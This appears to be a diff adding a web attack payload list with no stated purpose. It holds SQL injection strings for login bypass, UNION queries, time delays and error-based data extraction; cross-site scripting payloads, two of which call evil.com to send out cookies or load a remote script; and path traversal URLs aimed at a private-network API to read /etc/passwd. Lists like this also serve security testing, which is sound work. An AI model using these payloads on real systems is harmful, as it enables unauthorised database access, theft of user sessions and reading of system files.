@@ -1,0 +1,46 @@
+admin' --
+admin' --+
+admin' /* comment */
+1' OR 1=1 --
+name' -- -
+' OR/**/1=1
+' OR 'a' LIKE 'a'
+' OR(1=1)
+
+UNION SELECT 1,2,3
+UNION ALL SELECT 1,2,3
+UNION/**/SELECT 1,2
+UNION(SELECT 1)
+UNION/**/ALL/**/SELECT 1
+
+UNION+SELECT+1,2,3
+
+1' AND sleep(10) --
+1'; SELECT pg_sleep(10); --
+AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))
+AND UPDATEXML(1, CONCAT(0x5c, version()), 1)
+
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>fetch('http://evil.com?cookie='+document.cookie)</script>
+<script src="http://evil.com/xss.js"></script>
+<script src="//evil.com/xss.js"></script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=confirm('XSS')>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<a href="javascript:confirm(1)">Click me</a>
+<form action="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)>
+<video src=x onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+
+http://192.168.122.109:5000/api/file?filename=photo.jpeg
+http://192.168.122.109:5000/api/file?filename=../../../../../../../../../../../../etc/passwd
+http://192.168.122.109:5000/api/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
